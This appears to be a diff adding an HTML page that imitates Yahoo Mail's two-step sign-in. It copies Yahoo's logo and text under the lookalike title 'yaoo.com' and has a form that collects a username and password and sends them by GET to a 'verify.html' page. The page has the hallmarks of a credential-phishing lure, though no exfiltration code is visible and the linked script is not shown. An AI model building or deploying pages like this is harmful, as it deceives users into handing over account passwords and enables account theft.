@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="src/favicon-32x32.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="src/apple-touch-icon.png">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- <script src="app.js" defer></script> -->
+    <script src="script.js" type="module" defer></script>
+    <title>Login | yaoo.com</title>
+    <style>
+      :root {
+        --primary-clr-500: hsl(263, 100%, 59%);
+        --primary-clr-hover: hsl(263, 95%, 42%);
+      }
+
+      .custom-checkbox input[type="checkbox"] {
+        -webkit-appearance: none;
+        appearance: none;
+        width: 20px;
+        height: 20px;
+        border: 1px solid var(--primary-clr-hover); /* gray-300 */
+        border-radius: 0.25rem;
+        background: #fff;
+        display: inline-block;
+        vertical-align: middle;
+        position: relative;
+      }
+      .custom-checkbox input[type="checkbox"]:checked {
+        background-color: var(--primary-clr-500); /* brand purple */
+        border-color: var(--primary-clr-500);
+        background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffffff' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'><path d='M20 6L9 17l-5-5'/></svg>");
+        background-repeat: no-repeat;
+        background-position: center;
+        background-size: 60% 60%;
+      }
+      .custom-checkbox input[type="checkbox"]:focus {
+        outline: none;
+        box-shadow: 0 0 0 4px rgba(91, 0, 230, 0.12);
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Page wrapper -->
+    <div>
+      <!-- Top navigation / brand -->
+      <!-- ! media query here! -->
+      <header class="hidden lg:flex items-center justify-between py-8 px-12 text-md text-[var(--primary-clr-500)]">
+        <img class="w-[7rem] h-auto" src="src/yahoo logo.png" alt="Yahoo" />
+        <nav>
+          <ul class="flex space-x-4">
+            <li><a href="#">Help</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Privacy</a></li>
+          </ul>
+        </nav>
+      </header>
+
+      <main class="pt-2">
+        <!-- ! media query here! -->
+        <div class="lg:grid lg:grid-cols-[1fr_22.5rem] lg:gap-4 lg:w-[min(calc(100%-4rem),_64.5rem)] w-[calc(100%_-_1rem)] mx-auto">
+          <!-- Left hero/text area -->
+          <!-- ! media query here! -->
+          <section class="hidden lg:block grow-2 mt-10">
+            <strong class="text-xl mb-4 inline-block">Yahoo makes it easy to enjoy what matters most in your world.</strong>
+            <p class="text-[1.3rem] leading-tight">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
+          </section>
+
+          <!-- Right sign-in card -->
+          <aside>
+            <!-- ! media query here! -->
+            <div class="sm:w-[min(100%,_22.5rem)] sm:px-2 md:mt-0 md:shadow-[0_0_3px_rgba(0,0,0,0.2)] mt-20 w-full mx-auto rounded-xl pt-6 pb-14">
+              <img class="w-[5rem] mx-auto" src="src/yahoo logo.png" alt="Yahoo icon" />
+
+              <form action="verify.html" method="get">
+                <!-- STEP ONE -->
+                <div id="step-one" class="hiddens">
+                  <div class="mx-auto flex flex-col items-center mb-10 mt-[2rem]">
+                    <strong class="text-2xl mb-1 block">Sign in to Yahoo Mail</strong>
+                    <p>Sign in using your Yahoo account</p>
+                  </div>
+
+                  <div class="mx-[1.5rem]">
+                    <div class="mb-4">
+                      <label class="text-sm" for="username">Username, email or mobile</label>
+                      <input id="username" class="border-b border-gray-600 w-full px-2 py-2 mt-1 focus:outline-none focus:border-b-[var(--primary-clr-hover)] transition-colors duration-150 rounded-none appearance-none" name="username" type="text" />
+                      <span id="username-error-alert" class="text-red-500 text-xs hidden">Sorry, we don't recognise this email address.</span>
+                    </div>
+
+                    <button class="w-full bg-[var(--primary-clr-500)] font-semibold text-white px-2 py-2 mt-2 rounded-[10rem] || hover:bg-[var(--primary-clr-hover)] focus:bg-[var(--primary-clr-hover)] focus:outline-none transition-colors duration-150" type="button">Next</button>
+
+                    <div class="flex justify-between items-center text-sm mt-4 mb-6">
+                      <label class="inline-flex items-center gap-3 text-sm text-neutral-700 custom-checkbox">
+                        <input type="checkbox" name="stay" />
+                        <span class="select-none text-[var(--primary-clr-500)]">Stay signed in</span>
+                      </label>
+                      <a class="text-[var(--primary-clr-500)]" href="#">Forgotten username?</a>
+                    </div>
+
+                    <a
+                      class="text-[var(--primary-clr-500)] font-semibold border p-3 w-full inline-block border-[var(--primary-clr-500)] rounded-[10rem] text-center || hover:text-[var(--primary-clr-hover)] focus:text-[var(--primary-clr-hover)] focus:outline-none transition-colors duration-150"
+                      href="#"
+                    >
+                      Create an account
+                    </a>
+
+                    <span class="block text-center my-6 text-xl">or</span>
+
+                    <div>
+                      <button class="flex items-center justify-center gap-2 border-2 p-3 w-full inline-block rounded-[10rem] font-semibold" type="button">
+                        <img class="w-5 h-5" src="src/google.svg" alt="Google" />
+                        <span>Sign in with Google</span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- ==================================================== -->
+                <!-- ==================================================== -->
+                <!-- ==================================================== -->
+
+                <!-- STEP TWO -->
+                <div id="step-two" class="hidden">
+                  <div class="mx-auto flex flex-col items-center mb-8 mt-[1rem]">
+                    <p id="username-display" class="text-center mb-4">username</p>
+                    <strong class="text-2xl mb-1 block">Enter password</strong>
+                    <p>to finish signing in</p>
+                  </div>
+
+                  <div class="mx-[1.5rem]">
+                    <div class="mb-4 relative">
+                      <label class="text-sm" for="password">Password</label>
+                      <div class="relative">
+                        <input id="password" class="border-b border-gray-600 w-full px-2 py-2 mt-1 pr-10 focus:outline-none focus:border-b-[var(--primary-clr-hover)] transition-colors duration-150 rounded-none appearance-none" name="password" type="password" />
+                        <button id="toggle-password" type="button" aria-label="Show password" class="absolute right-0 top-1/2 transform -translate-y-1/2 px-2 text-gray-600">
+                          <i id="toggle-icon" class="fa-regular fa-eye"></i>
+                        </button>
+                      </div>
+                      <span id="password-error-alert" class="text-red-500 text-xs hidden">Please provide password.</span>
+                    </div>
+
+                    <a class="text-[var(--primary-clr-500)] inline-block mb-4" href="#">Forgotten password?</a>
+
+                    <button class="w-full bg-[var(--primary-clr-500)] font-semibold text-white px-2 py-2 mt-2 rounded-[10rem] || hover:bg-[var(--primary-clr-hover)] focus:bg-[var(--primary-clr-hover)] focus:outline-none transition-colors duration-150" type="submit" disabled>Next</button>
+                  </div>
+                </div>
+              </form>
+            </div>
+          </aside>
+        </div>
+      </main>
+    </div>
+
+    <!-- toggle password visibility script -->
+    <script defer>
+      document.addEventListener("DOMContentLoaded", function () {
+        const toggle = document.getElementById("toggle-password");
+        const pwd = document.getElementById("password");
+        const icon = document.getElementById("toggle-icon");
+
+        if (!toggle || !pwd || !icon) return;
+        console.log(pwd);
+
+        toggle.addEventListener("click", function () {
+          if (pwd.type === "password") {
+            pwd.type = "text";
+            icon.classList.remove("fa-eye");
+            icon.classList.add("fa-eye-slash");
+            toggle.setAttribute("aria-label", "Hide password");
+          } else {
+            pwd.type = "password";
+            icon.classList.remove("fa-eye-slash");
+            icon.classList.add("fa-eye");
+            toggle.setAttribute("aria-label", "Show password");
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
